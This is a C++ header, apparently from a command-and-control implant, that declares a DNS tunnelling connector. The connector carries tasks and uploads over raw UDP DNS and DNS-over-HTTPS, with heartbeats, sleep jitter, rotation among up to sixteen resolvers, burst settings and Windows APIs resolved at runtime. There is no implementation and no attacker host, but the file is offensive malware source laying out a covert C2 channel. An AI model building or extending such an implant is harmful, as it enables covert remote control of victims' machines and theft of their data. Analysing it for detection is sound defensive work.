#pragma once

#include "AgentConfig.h"
#include <windows.h>
#include <wininet.h>
#include "Connector.h"

#define DECL_API(x) decltype(x) * x

// DNS function pointers structure (for UDP DNS)
struct DNSFUNC {
    DECL_API(LocalAlloc);
    DECL_API(LocalReAlloc);
    DECL_API(LocalFree);
    DECL_API(WSAStartup);
    DECL_API(WSACleanup);
    DECL_API(socket);
    DECL_API(closesocket);
    DECL_API(sendto);
    DECL_API(recvfrom);
    DECL_API(select);
    DECL_API(gethostbyname);
    DECL_API(Sleep);
    DECL_API(GetTickCount);
    DECL_API(LoadLibraryA);
    DECL_API(GetLastError);
};

struct DOHFUNC {
    DECL_API(InternetOpenA);
    DECL_API(InternetConnectA);
    DECL_API(HttpOpenRequestA);
    DECL_API(HttpSendRequestA);
    DECL_API(InternetSetOptionA);
    DECL_API(InternetQueryOptionA);
    DECL_API(HttpQueryInfoA);
    DECL_API(InternetQueryDataAvailable);
    DECL_API(InternetCloseHandle);
    DECL_API(InternetReadFile);
};

struct DohResolverInfo {
    CHAR host[256];
    CHAR path[128];
    WORD port;
};

// DNS protocol metadata header
#pragma pack(push, 1)
typedef struct _DNS_META_V1 {
    BYTE   version;
    BYTE   metaFlags;
    USHORT reserved;
    ULONG  downAckOffset;
} DNS_META_V1, * PDNS_META_V1;
#pragma pack(pop)

class ConnectorDNS : public Connector
{
public:
    // Constants
    static const ULONG kMaxUploadSize = 4 << 20;  // 4 MB
    static const ULONG kMaxDownloadSize = 4 << 20;  // 4 MB
    static const ULONG kDefaultPktSize = 1024;
    static const ULONG kMaxPktSize = 64000;
    static const ULONG kMaxSafeFrame = 60;
    static const ULONG kDefaultLabelSize = 48;
    static const ULONG kMaxLabelSize = 63;
    static const ULONG kMetaSize = sizeof(DNS_META_V1);
    static const ULONG kHeaderSize = kMetaSize + 8;  // meta + total + offset
    static const ULONG kFrameHeaderSize = 9;  // flags:1 + nonce:4 + origLen:4
    static const ULONG kAckDataSize = 12;
    static const ULONG kReqDataSize = 8;
    static const ULONG kDnsSignalBits = 0x1;
    static const ULONG kMaxResolvers = 16;
    static const ULONG kMaxFailCount = 2;
    static const ULONG kQueryTimeout = 3;  // seconds
    static const ULONG kMaxRetries = 3;

private:
    ProfileDNS profile = { 0 };

    CHAR  rawResolvers[512] = { 0 };
    CHAR* resolverList[kMaxResolvers] = { 0 };
    ULONG resolverCount = 0;
    ULONG currentResolverIndex = 0;
    ULONG resolverFailCount[kMaxResolvers] = { 0 };
    ULONG resolverDisabledUntil[kMaxResolvers] = { 0 };

    CHAR  sid[17] = { 0 };
    BYTE  encryptKey[16] = { 0 };
    ULONG pktSize = 0;
    ULONG labelSize = 0;
    CHAR  domain[256] = { 0 };
    CHAR  qtype[8] = { 0 };
    BOOL  initialized = FALSE;
    BOOL  hiSent = FALSE;
    BYTE* hiBeat = NULL;
    ULONG hiBeatSize = 0;
    ULONG hiRetries = kMaxRetries;
    ULONG seq = 0;
    ULONG idx = 0;

    BYTE* recvData = NULL;
    int   recvSize = 0;

    BYTE* downBuf = NULL;
    ULONG downTotal = 0;
    ULONG downFilled = 0;
    ULONG downAckOffset = 0;
    ULONG downTaskNonce = 0;

    BOOL  compressEnabled = TRUE;
    ULONG lastDownTotal = 0;
    ULONG lastUpTotal = 0;

    BOOL  lastQueryOk = FALSE;

    ULONG sleepDelaySeconds = 0;

    BOOL  hasPendingTasks = FALSE;
    BOOL  forcePoll = FALSE;
    ULONG consecutiveFailures = 0;

    // Upload fragment tracking for reliability
    static const ULONG kMaxTrackedOffsets = 256;
    ULONG confirmedOffsets[kMaxTrackedOffsets] = { 0 };
    ULONG confirmedCount = 0;
    ULONG lastAckNextExpected = 0;
    BOOL  uploadNeedsReset = FALSE;
    ULONG uploadStartTime = 0;

    DNSFUNC* functions = NULL;

    DOHFUNC* dohFunctions = NULL;
    BOOL     dohInitialized = FALSE;
    HINTERNET hInternet = NULL;
    DohResolverInfo dohResolverList[kMaxResolvers] = { 0 };
    ULONG dohResolverCount = 0;
    ULONG currentDohResolverIndex = 0;
    ULONG dohResolverFailCount[kMaxResolvers] = { 0 };
    ULONG dohResolverDisabledUntil[kMaxResolvers] = { 0 };
    ULONG dnsMode = DNS_MODE_UDP;

    // WSA and socket caching (optimization)
    BOOL   wsaInitialized = FALSE;
    SOCKET cachedSocket = INVALID_SOCKET;

    // Pre-allocated buffers for hot path (optimization)
    BYTE* queryBuffer = NULL;
    BYTE* respBuffer = NULL;
    static const ULONG kQueryBufferSize = 4096;
    static const ULONG kRespBufferSize = 4096;

    BYTE* pendingUpload = NULL;
    ULONG pendingUploadSize = 0;
    ULONG uploadBackoffMs = 0;
    ULONG nextUploadAttemptTick = 0;

    ULONG nextForcePollTick = 0;

    BOOL lastExchangeHadData = FALSE;

    // Private helper methods
    BOOL  InitWSA();
    void  CleanupWSA();
    SOCKET GetSocket();
    void  ReleaseSocket(SOCKET s, BOOL forceClose);
    void  MetaV1Init(DNS_META_V1* h);
    ULONG BuildWireSeq(ULONG logicalSeq, ULONG signalBits);
    BOOL  QuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
    void  ParseResolvers(const CHAR* resolvers);
    void  BuildAckData(BYTE* ackData, ULONG ackOffset, ULONG nonce, ULONG taskNonce);
    void  SendHeartbeat();
    void  SendAck();
    void  HandleUpload(BYTE* data, ULONG data_size);
    void  HandleDownload();
    BOOL  ProcessDownloadChunk(BYTE* binBuf, int binLen);
    void  FinalizeDownload();
    void  ResetDownload();

    // Upload reliability helpers
    BOOL  ParsePutAckResponse(BYTE* response, ULONG respLen, ULONG* outNextExpected, BOOL* outComplete, BOOL* outNeedsReset);
    BOOL  IsOffsetConfirmed(ULONG offset);
    void  MarkOffsetConfirmed(ULONG offset);
    void  ResetUploadState();

    BOOL  InitDoH();
    void  CleanupDoH();
    void  ParseDohResolvers(const CHAR* dohResolvers);
    BOOL  QueryDoH(const CHAR* qname, const DohResolverInfo* resolver, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
    BOOL  QueryDoHWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
    BOOL  BuildDnsWireQuery(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outLen);
    BOOL  ParseDnsWireResponse(BYTE* response, ULONG respLen, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);

    void  SendData(BYTE* data, ULONG data_size);

    void  UpdateResolvers(BYTE* resolvers);
    void  UpdateBurstConfig(ULONG enabled, ULONG sleepMs, ULONG jitterPct);
    void  GetBurstConfig(ULONG* enabled, ULONG* sleepMs, ULONG* jitterPct);
    void  UpdateSleepDelay(ULONG sleepSeconds);
    void  ResetTrafficTotals() { lastUpTotal = 0; lastDownTotal = 0; }
    BOOL  IsBusy() const;
    void  ForcePollOnce() { this->forcePoll = TRUE; }
    BOOL  IsForcePollPending() const { return this->forcePoll; }
    BOOL  WasLastQueryOk() const { return lastQueryOk; }
    const BYTE* GetResolvers() const { return profile.resolvers; }
    BOOL  QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
    BOOL  QueryUdpWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);

public:
    ConnectorDNS();
    ~ConnectorDNS();

    BOOL SetProfile(void* profile, BYTE* beat, ULONG beatSize) override;
    void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
    void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput) override;
    void CloseConnector() override;

    BYTE* RecvData() override;
    int   RecvSize() override;
    void  RecvClear() override;

    static void* operator new(size_t sz);
    static void operator delete(void* p) noexcept;
};